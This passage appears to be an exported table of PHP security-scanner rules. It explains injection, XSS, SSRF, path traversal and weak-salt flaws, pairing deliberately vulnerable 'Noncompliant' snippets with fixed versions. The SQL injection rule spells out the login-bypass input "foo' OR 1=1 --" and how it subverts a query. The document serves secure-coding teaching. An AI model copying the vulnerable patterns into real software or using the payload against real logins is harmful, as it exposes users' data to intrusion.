  <li> <a href=""https://cwe.mitre.org/data/definitions/601.html"">MITRE, CWE-601</a> - URL Redirection to Untrusted Site ('Open Redirect') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",HTTP request redirections should not be open to forging attacks,[],BLOCKER,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, POST data payloads or cookies, should always be considered untrusted and tainted. Applications logging
tainted data could enable an attacker to inject characters that would break the log file pattern. This could be used to block monitors and SIEM
(Security Information and Event Management) systems from detecting other malicious events.</p>
<p>This problem could be mitigated by sanitizing the user provided data before logging it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$data = $_GET[""data""];
error_log($data); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$data = $_GET[""data""];
$badchars = array(""\n"", ""\r"", ""\t"");
$safedata = str_replace($badchars, """", $data);
error_log($safedata);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Logging_Cheat_Sheet"">OWASP Cheat Sheet</a> - Logging </li>
  <li> <a href=""https://www.owasp.org/index.php/Log_Injection"">OWASP Attack Category</a> - Log Injection </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A1-Injection"">OWASP Top 10 2017</a> - Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",phpsecurity:S5145,php,PHP,"<p>User provided data, such as URL parameters, POST data payloads or cookies, should always be considered untrusted and tainted. Applications logging
tainted data could enable an attacker to inject characters that would break the log file pattern. This could be used to block monitors and SIEM
(Security Information and Event Management) systems from detecting other malicious events.</p>
<p>This problem could be mitigated by sanitizing the user provided data before logging it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$data = $_GET[""data""];
error_log($data); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$data = $_GET[""data""];
$badchars = array(""\n"", ""\r"", ""\t"");
$safedata = str_replace($badchars, """", $data);
error_log($safedata);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Logging_Cheat_Sheet"">OWASP Cheat Sheet</a> - Logging </li>
  <li> <a href=""https://www.owasp.org/index.php/Log_Injection"">OWASP Attack Category</a> - Log Injection </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A1-Injection"">OWASP Top 10 2017</a> - Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Logging should not be vulnerable to injection attacks,[],MINOR,"['cwe', 'owasp-a1', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to inject characters that would be interpreted as a new line in some
browsers. This could, for example, enable Cross-Site Scripting (XSS) attacks.</p>
<p>Most modern web application frameworks and servers mitigate this type of attack by default, but there might be rare cases where older versions are
still vulnerable. As a best practice, applications that use user provided data to construct the response header should always validate the data first.
Validation should be based on a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$value = $_GET[""value""];
header(""X-Header: $value""); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$value = $_GET[""value""];
if (ctype_alnum($value)) {
  header(""X-Header: $value""); // Compliant
} else {
  // Error
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/HTTP_Response_Splitting"">OWASP Attack Category</a> - HTTP Response Splitting </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/113.html"">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP
  Response Splitting') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",phpsecurity:S5167,php,PHP,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to inject characters that would be interpreted as a new line in some
browsers. This could, for example, enable Cross-Site Scripting (XSS) attacks.</p>
<p>Most modern web application frameworks and servers mitigate this type of attack by default, but there might be rare cases where older versions are
still vulnerable. As a best practice, applications that use user provided data to construct the response header should always validate the data first.
Validation should be based on a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$value = $_GET[""value""];
header(""X-Header: $value""); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$value = $_GET[""value""];
if (ctype_alnum($value)) {
  header(""X-Header: $value""); // Compliant
} else {
  // Error
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/HTTP_Response_Splitting"">OWASP Attack Category</a> - HTTP Response Splitting </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/113.html"">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP
  Response Splitting') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",HTTP response headers should not be vulnerable to injection attacks,[],MINOR,"['cwe', 'owasp-a7', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands or
exposes sensitive data.</p>
<p>The mitigation strategy should be based on whitelisting of allowed characters or commands.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/88"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",phpsecurity:S2076,php,PHP,"<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands or
exposes sensitive data.</p>
<p>The mitigation strategy should be based on whitelisting of allowed characters or commands.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/88"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",OS commands should not be vulnerable to injection attacks,[],BLOCKER,"['cwe', 'owasp-a1', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Endpoints reflecting
back tainted data could allow attackers to inject code that would eventually be executed in the user's browser. This could enable a wide range of
serious attacks like accessing/modifying sensitive information or impersonating other users.</p>
<p>Typically, the solution is one of the following:</p>
<ul>
  <li> Validate user provided data based on a whitelist and reject input that's not whitelisted. </li>
  <li> Sanitize user provided data from any characters that can be used for malicious purposes. </li>
  <li> Encode user provided data being reflected as output. Adjust the encoding to the output context so that, for example, HTML encoding is used for
  HTML content, HTML attribute encoding is used for attribute values, and JavaScript encoding is used for server-generated JavaScript. </li>
</ul>
<p>When sanitizing or encoding data, it is recommended to only use libraries specifically designed for security purposes. Also, make sure that the
library you are using is being actively maintained and is kept up-to-date with the latest discovered vulnerabilities.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$name = $_GET[""name""];
echo ""Welcome $name""; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$name = $_GET[""name""];
$safename = htmlspecialchars($name);
echo ""Welcome $safename"";
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md"">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/80.html"">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/81.html"">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/82.html"">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a
  Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/83.html"">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/84.html"">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/85.html"">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/86.html"">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in
  Web Pages </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/87.html"">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",phpsecurity:S5131,php,PHP,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Endpoints reflecting
back tainted data could allow attackers to inject code that would eventually be executed in the user's browser. This could enable a wide range of
serious attacks like accessing/modifying sensitive information or impersonating other users.</p>
<p>Typically, the solution is one of the following:</p>
<ul>
  <li> Validate user provided data based on a whitelist and reject input that's not whitelisted. </li>
  <li> Sanitize user provided data from any characters that can be used for malicious purposes. </li>
  <li> Encode user provided data being reflected as output. Adjust the encoding to the output context so that, for example, HTML encoding is used for
  HTML content, HTML attribute encoding is used for attribute values, and JavaScript encoding is used for server-generated JavaScript. </li>
</ul>
<p>When sanitizing or encoding data, it is recommended to only use libraries specifically designed for security purposes. Also, make sure that the
library you are using is being actively maintained and is kept up-to-date with the latest discovered vulnerabilities.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$name = $_GET[""name""];
echo ""Welcome $name""; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$name = $_GET[""name""];
$safename = htmlspecialchars($name);
echo ""Welcome $safename"";
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md"">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/80.html"">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/81.html"">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/82.html"">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a
  Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/83.html"">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/84.html"">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/85.html"">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/86.html"">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in
  Web Pages </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/87.html"">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks,[],BLOCKER,"['cwe', 'owasp-a7', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. A remote server
making requests to URLs based on tainted data could enable attackers to make arbitrary requests to the internal network or to the local file
system.</p>
<p>The problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not send requests based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
$url = $_GET[""url""];
$resp = file_get_contents($url); // Noncompliant
// ...
</pre>
<h2>Compliant Solution</h2>
<pre>
$whitelist = array(
  ""https://www.sonarsource.com""
);
$url = $_GET[""url""];
if (in_array($url, $whitelist)) {
  $resp = file_get_contents($url);
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Server_Side_Request_Forgery"">OWASP Attack Category</a> - Server Side Request Forgery </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/918.html"">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",phpsecurity:S5144,php,PHP,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. A remote server
making requests to URLs based on tainted data could enable attackers to make arbitrary requests to the internal network or to the local file
system.</p>
<p>The problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not send requests based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
$url = $_GET[""url""];
$resp = file_get_contents($url); // Noncompliant
// ...
</pre>
<h2>Compliant Solution</h2>
<pre>
$whitelist = array(
  ""https://www.sonarsource.com""
);
$url = $_GET[""url""];
if (in_array($url, $whitelist)) {
  $resp = file_get_contents($url);
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Server_Side_Request_Forgery"">OWASP Attack Category</a> - Server Side Request Forgery </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/918.html"">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",Server-side requests should not be vulnerable to forging attacks,[],MAJOR,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Constructing file
system paths directly from tainted data could enable an attacker to inject specially crafted values, such as <code>'../'</code>, that change the
initial path and, when accessed, resolve to a path on the filesystem where the user should normally not have access.</p>
<p>A successful attack might give an attacker the ability to read, modify, or delete sensitive information from the file system and sometimes even
execute arbitrary operating system commands. This is often referred to as a ""path traversal"" or ""directory traversal"" attack.</p>
<p>The mitigation strategy should be based on the whitelisting of allowed paths or characters.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/23"">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/36"">MITRE, CWE-36</a> - Absolute Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/99"">MITRE, CWE-99</a> - Improper Control of Resource Identifiers ('Resource Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources </li>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",phpsecurity:S2083,php,PHP,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Constructing file
system paths directly from tainted data could enable an attacker to inject specially crafted values, such as <code>'../'</code>, that change the
initial path and, when accessed, resolve to a path on the filesystem where the user should normally not have access.</p>
<p>A successful attack might give an attacker the ability to read, modify, or delete sensitive information from the file system and sometimes even
execute arbitrary operating system commands. This is often referred to as a ""path traversal"" or ""directory traversal"" attack.</p>
<p>The mitigation strategy should be based on the whitelisting of allowed paths or characters.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/23"">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/36"">MITRE, CWE-36</a> - Absolute Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/99"">MITRE, CWE-99</a> - Improper Control of Resource Identifiers ('Resource Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources </li>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",I/O function calls should not be vulnerable to path injection attacks,[],BLOCKER,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing SQL queries directly from tainted data
enables attackers to inject specially crafted values that change the initial meaning of the query itself. Successful SQL injection attacks can read,
modify, or delete sensitive information from the database and sometimes even shut it down or execute arbitrary operating system commands.</p>
<p>Typically, the solution is to rely on prepared statements rather than string concatenation to inject tainted data into SQL queries, which ensures
that they will be properly escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function authenticate() {
  if( isset( $_POST[ 'Connect' ] ) ) {
    $login = $_POST[ 'login' ];
    $pass = $_POST[ 'pass' ];

    $query = ""SELECT * FROM users WHERE login = '"" . $login . ""' AND pass = '"" . $pass . ""'""; // Unsafe

    // If the special value ""foo' OR 1=1 --"" is passed as either the user or pass, authentication is bypassed
    // Indeed, if it is passed as a user, the query becomes:
    // SELECT * FROM users WHERE user = 'foo' OR 1=1 --' AND pass = '...'
    // As '--' is the comment till end of line syntax in SQL, this is equivalent to:
    // SELECT * FROM users WHERE user = 'foo' OR 1=1
    // which is equivalent to:
    // SELECT * FROM users WHERE 1=1
    // which is equivalent to:
    // SELECT * FROM users

    $con = getDatabaseConnection();
    $result = mysqli_query($con, $query);

    $authenticated = false;
    if ( $row = mysqli_fetch_row( $result ) ) {
      $authenticated = true;
    }
    mysqli_free_result( $result );
    return $authenticated;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function authenticate() {
  if( isset( $_POST[ 'Connect' ] ) ) {
    $login = $_POST[ 'login' ];
    $pass = $_POST[ 'pass' ];

    $query = ""SELECT * FROM users WHERE login = ? AND pass = ?""; // Safe even if authenticate() method is still vulnerable to brute-force attack in this specific case

    $stmt = $pdo-&gt;prepare($query);

    $stmt-&gt;execute(array($login, $pass));

    $authenticated = false;
    if ( $stmt-&gt;rowCount() == 1 ) {
      $authenticated = true;
    }

    return $authenticated;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",phpsecurity:S3649,php,PHP,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing SQL queries directly from tainted data
enables attackers to inject specially crafted values that change the initial meaning of the query itself. Successful SQL injection attacks can read,
modify, or delete sensitive information from the database and sometimes even shut it down or execute arbitrary operating system commands.</p>
<p>Typically, the solution is to rely on prepared statements rather than string concatenation to inject tainted data into SQL queries, which ensures
that they will be properly escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function authenticate() {
  if( isset( $_POST[ 'Connect' ] ) ) {
    $login = $_POST[ 'login' ];
    $pass = $_POST[ 'pass' ];

    $query = ""SELECT * FROM users WHERE login = '"" . $login . ""' AND pass = '"" . $pass . ""'""; // Unsafe

    // If the special value ""foo' OR 1=1 --"" is passed as either the user or pass, authentication is bypassed
    // Indeed, if it is passed as a user, the query becomes:
    // SELECT * FROM users WHERE user = 'foo' OR 1=1 --' AND pass = '...'
    // As '--' is the comment till end of line syntax in SQL, this is equivalent to:
    // SELECT * FROM users WHERE user = 'foo' OR 1=1
    // which is equivalent to:
    // SELECT * FROM users WHERE 1=1
    // which is equivalent to:
    // SELECT * FROM users

    $con = getDatabaseConnection();
    $result = mysqli_query($con, $query);

    $authenticated = false;
    if ( $row = mysqli_fetch_row( $result ) ) {
      $authenticated = true;
    }
    mysqli_free_result( $result );
    return $authenticated;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function authenticate() {
  if( isset( $_POST[ 'Connect' ] ) ) {
    $login = $_POST[ 'login' ];
    $pass = $_POST[ 'pass' ];

    $query = ""SELECT * FROM users WHERE login = ? AND pass = ?""; // Safe even if authenticate() method is still vulnerable to brute-force attack in this specific case

    $stmt = $pdo-&gt;prepare($query);

    $stmt-&gt;execute(array($login, $pass));

    $authenticated = false;
    if ( $stmt-&gt;rowCount() == 1 ) {
      $authenticated = true;
    }

    return $authenticated;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",SQL queries should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing XPath expressions directly from tainted
data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath injection
attacks can read sensitive information from XML documents.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",phpsecurity:S2091,php,PHP,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing XPath expressions directly from tainted
data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath injection
attacks can read sensitive information from XML documents.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",XPath expressions should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1']",VULNERABILITY
2018-07-31T12:24:47+0200,"<p>In cryptography, ""salt"" is extra piece of data which is included in a hashing algorithm. It makes dictionary attacks more difficult. Using a
cryptographic hash function without an unpredictable salt increases the likelihood that an attacker will be able to successfully guess a hashed value
such as a password with a dictionary attack.</p>
<p>This rule raises an issue when a hashing function which has been specifically designed for hashing sensitive data, such as pbkdf2, is used with a
non-random, reused or too short salt value. It does not raise an issue on base hashing algorithms such as sha1 or md5 as these are often used for
other purposes.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> use hashing functions generating their own salt or generate a long random salt of at least 32 bytes. </li>
  <li> the salt is at least as long as the resulting hash value. </li>
  <li> provide the salt to a safe hashing function such as PBKDF2. </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function createMyAccount() {
  $email = $_GET['email'];
  $name = $_GET['name'];
  $password = $_GET['password'];

  $hash = hash_pbkdf2('sha256', $password, $email, 100000); // Noncompliant; salt (3rd argument) is predictable because initialized with the provided $email

  $hash = hash_pbkdf2('sha256', $password, '', 100000); // Noncompliant; salt is empty

  $hash = hash_pbkdf2('sha256', $password, 'D8VxSmTZt2E2YV454mkqAY5e', 100000); // Noncompliant; salt is hardcoded

  $hash = crypt($password); // Noncompliant; salt is not provided
  $hash = crypt($password, """"); // Noncompliant; salt is hardcoded

  $options = [
    'cost' =&gt; 11,
    'salt' =&gt; mcrypt_create_iv(22, MCRYPT_DEV_URANDOM), // Noncompliant ; use salt generated by default
  ];
  echo password_hash(""rasmuslerdorf"", PASSWORD_BCRYPT, $options);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$salt = openssl_random_pseudo_bytes(16);
$hash = hash_pbkdf2(""sha256"", $password, $salt, $iterations, 20);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S2053,php,PHP,"<p>In cryptography, ""salt"" is extra piece of data which is included in a hashing algorithm. It makes dictionary attacks more difficult. Using a
cryptographic hash function without an unpredictable salt increases the likelihood that an attacker will be able to successfully guess a hashed value
such as a password with a dictionary attack.</p>
